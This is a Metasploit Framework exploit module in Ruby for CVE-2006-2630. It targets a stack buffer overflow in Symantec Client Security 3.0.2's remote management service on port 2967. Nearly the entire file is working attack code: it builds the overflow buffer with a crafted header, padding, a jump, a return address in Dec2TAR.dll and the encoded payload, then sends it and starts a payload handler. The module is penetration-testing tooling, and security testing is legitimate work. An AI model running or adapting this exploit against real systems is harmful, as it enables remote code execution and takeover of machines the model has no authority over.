##
# $Id: symantec_rtvscan.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Symantec Remote Management Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Symantec Client Security 3.0.x.
				This module has only been tested against Symantec Client Security 3.0.2
				build 10.0.2.2000.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					['CVE', '2006-2630'],
					['OSVDB', '25846'],
					['BID', '18107'],
					['URL', 'http://research.eeye.com/html/advisories/published/AD20060612.html'],
				],
			'Privileged'     => true,

			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00",
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'SCS 3.0.2 build 10.0.2.2000', { 'Ret' => 0x69985624 } ], # Dec2TAR.dll
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'May 24 2006'))

		register_options(
			[
				Opt::RPORT(2967)
			], self.class)
	end

	def exploit
		connect

		header =  "\x01\x10\x0a\x20\x0a\x00\x00\x00"
		header << "\x02\x18\x00\x01\x00\x00\x00\x00"
		header << "\x00\x24\x00\x14\xb7\xc9\xd2\xd9"
		header << "\x3e\x33\xef\x34\x25\x1f\x43\x00"

		crufta =  rand_text_alphanumeric(512)
		cruftb =  rand_text_alphanumeric(514)
		cruftc =  payload.encoded + rand_text_alphanumeric(513 - payload.encoded.length)
		cruftd =  rand_text_alphanumeric(495)

		cruftd[479, 2] = "\xeb\x06"
		cruftd[483, 4] = [target.ret].pack('V')
		cruftd[487, 5] = [0xe8, -1000].pack('CV')

		cruftd << rand_text_alphanumeric(21)
		crufte =  rand_text_alphanumeric(6) + "\x19\x00\x00\x00"
		crufte << rand_text_alphanumeric(504) + "\x00\x00"

		overflow =  [ crufta.length ].pack('v') + crufta
		overflow << [ cruftb.length ].pack('v') + cruftb
		overflow << [ cruftc.length ].pack('v') + cruftc
		overflow << [ cruftd.length ].pack('v') + cruftd
		overflow << [ crufte.length ].pack('v') + crufte

		sploit = header + overflow

		print_status("Trying target #{target.name}...")
		sock.put(sploit)

		handler
		disconnect
	end

end
